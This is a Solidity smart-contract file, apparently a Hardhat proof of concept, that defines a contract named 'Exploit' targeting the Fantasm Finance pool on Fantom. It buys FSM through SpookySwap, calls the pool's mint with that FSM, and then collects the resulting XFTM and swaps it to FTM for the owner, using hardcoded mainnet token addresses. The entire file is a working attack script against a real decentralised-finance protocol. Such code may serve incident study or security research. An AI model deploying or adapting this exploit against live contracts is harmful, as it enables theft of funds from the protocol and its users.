// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ISpookyRouter {
    function swapExactTokensForETH(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

interface IFantasmFinancePool {
    function collect() external;
    function mint(uint256 _fantasmIn, uint256 _minXftmOut) external payable;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    
    address private immutable owner;
    
    ISpookyRouter private immutable spookyRouter;
    
    IFantasmFinancePool private immutable fantasmFinancePool;
    
    address private immutable FSM = 0xaa621D2002b5a6275EF62d7a065A865167914801;

    address private immutable WFTM = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;

    address private immutable XFTM = 0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F;

    constructor(address spookyRouteAddr, address fantasmFinancePoolAddr) {
        owner = msg.sender;
        spookyRouter = ISpookyRouter(spookyRouteAddr);
        fantasmFinancePool = IFantasmFinancePool(fantasmFinancePoolAddr);
    }

    function execute() payable external {
        console.log("Start swapping FTM to FSM and mint XFTM with FSM");
        //lets get some FSM first, basically if we want to mint 1M XFTM, we will need around 200000 FSM
        //base on the current CR
        address[] memory path = new address[](2);
        path[0] = WFTM;
        path[1] = FSM;
        spookyRouter.swapExactETHForTokens{ value : 20000 ether }(0, path, address(this), block.timestamp + 1 days);
        IERC20(FSM).approve(address(fantasmFinancePool), type(uint).max);
        fantasmFinancePool.mint(IERC20(FSM).balanceOf(address(this)), 0);
    }

    function collect() external {
        require(msg.sender == owner, "Nope");
        console.log("Collecting XFTM and swap to FTM");
        fantasmFinancePool.collect();
        uint256 xFTMBalance = IERC20(XFTM).balanceOf(address(this));
        console.log(xFTMBalance);
        require(xFTMBalance > 0, "Failed to collect XFTM");

        IERC20(XFTM).approve(address(spookyRouter), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = XFTM;
        path[1] = WFTM;
        spookyRouter.swapExactTokensForETH(xFTMBalance, 0, path, owner, block.timestamp + 1 days);
    }

    receive() payable external {}
}